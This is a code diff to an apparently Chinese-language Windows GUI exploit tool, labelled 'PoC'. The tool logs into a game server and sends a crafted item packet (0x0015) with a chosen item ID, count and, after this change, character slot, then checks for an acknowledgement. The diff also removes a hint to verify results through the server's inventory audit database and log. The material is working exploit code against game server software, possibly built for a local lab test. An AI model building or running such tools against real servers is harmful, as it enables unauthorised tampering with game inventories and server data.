@@ -46,8 +46,9 @@ constexpr int IDC_MID = 1003;
 constexpr int IDC_PWD = 1004;
 constexpr int IDC_ITEM = 1005;
 constexpr int IDC_COUNT = 1006;
-constexpr int IDC_RUN = 1007;
-constexpr int IDC_LOG = 1008;
+constexpr int IDC_SLOT = 1007;
+constexpr int IDC_RUN = 1008;
+constexpr int IDC_LOG = 1009;
 
 HINSTANCE g_hinst = nullptr;
 HWND g_hwnd = nullptr;
@@ -57,6 +58,7 @@ HWND g_edMid = nullptr;
 HWND g_edPwd = nullptr;
 HWND g_edItem = nullptr;
 HWND g_edCount = nullptr;
+HWND g_edSlot = nullptr;
 HWND g_btnRun = nullptr;
 HWND g_log = nullptr;
 bool g_running = false;
@@ -68,6 +70,7 @@ struct ExpParams {
     std::wstring pwdHash;
     long itemId;
     long count;
+    long slot;
 };
 
 // ---------------------------------------------------------------------------
@@ -221,9 +224,11 @@ DWORD WINAPI ExpThread(LPVOID param) {
     bool got = RecvQuiet(s, r, 3000, 600);
     LogFmt(L"[<-] login ack %zuB  %s", r.size(), got ? L"OK" : L"TIMEOUT(继续尝试)");
 
-    // 2) 选角 slot=0 —— 服务端会推大量同步包
+    // 2) 选角 —— 服务端会推大量同步包
     {
-        std::vector<uint8_t> body = {0x00, 0x00};  // struct.pack("<H", 0)
+        uint16_t slot = static_cast<uint16_t>(prm.slot & 0xFFFF);
+        std::vector<uint8_t> body = {static_cast<uint8_t>(slot & 0xFF),
+                                     static_cast<uint8_t>((slot >> 8) & 0xFF)};
         SendAll(s, proto::game_frame(T_SELECT_CHAR, body, 2));
     }
     RecvQuiet(s, r, 4000, 600);
@@ -242,15 +247,8 @@ DWORD WINAPI ExpThread(LPVOID param) {
     if (got) LogHex(L"      hex:", r, 64);
 
     bool ok = got && r.size() >= 3 && r[0] == 0x01 && r[1] == 0x15 && r[2] == 0x00;
-    LogLine(ok ? L"[!] 0x0015 ACK 收到——用下方 SQL 复核入包"
+    LogLine(ok ? L"[!] 0x0015 ACK 收到——请到服务器侧复核入包结果"
                : L"[x] 0x0015 ACK 未收到");
-
-    LogFmt(L"\r\n[复核 SQL](只读查询):\r\n"
-           L"  sqlite3 'file:/home/ubuntu/.local/state/servers4a21/data/inventory.db?mode=ro' "
-           L"\"SELECT created_at,action_name,slot_index,item_id,count_delta "
-           L"FROM inventory_audit_log WHERE item_id=%ld ORDER BY audit_id DESC LIMIT 5;\"\r\n"
-           L"  grep 'BUY_ITEM' ~/.local/state/servers4a21/log/server.log | tail -5",
-           prm.itemId);
 
     closesocket(s);
     PostMessageW(g_hwnd, WM_EXP_FINISHED, 0, 0);
@@ -304,10 +302,12 @@ void CreateControls(HWND hwnd) {
     g_edItem = edit(60, 44, 100, L"29692", IDC_ITEM);
     label(170, 47, 45, L"数量:");
     g_edCount = edit(215, 44, 60, L"3", IDC_COUNT);
+    label(285, 47, 45, L"选角:");
+    g_edSlot = edit(325, 44, 50, L"0", IDC_SLOT);
 
     g_btnRun = CreateWindowExW(0, L"BUTTON", L"执行 PoC",
                                WS_CHILD | WS_VISIBLE | BS_PUSHBUTTON,
-                               300, 42, 100, 26, hwnd,
+                               395, 42, 100, 26, hwnd,
                                reinterpret_cast<HMENU>(IDC_RUN), g_hinst, nullptr);
     SendMessageW(g_btnRun, WM_SETFONT, reinterpret_cast<WPARAM>(font), TRUE);
 
@@ -334,6 +334,7 @@ void RunExp() {
         GetEditText(g_edPwd),
         GetEditInt(g_edItem, 29692),
         GetEditInt(g_edCount, 3),
+        GetEditInt(g_edSlot, 0),
     };
     if (p->host.empty() || p->mid.empty() || p->pwdHash.empty()) {
         LogLine(L"[!] HOST / 账号 / 密码哈希 不能为空。");
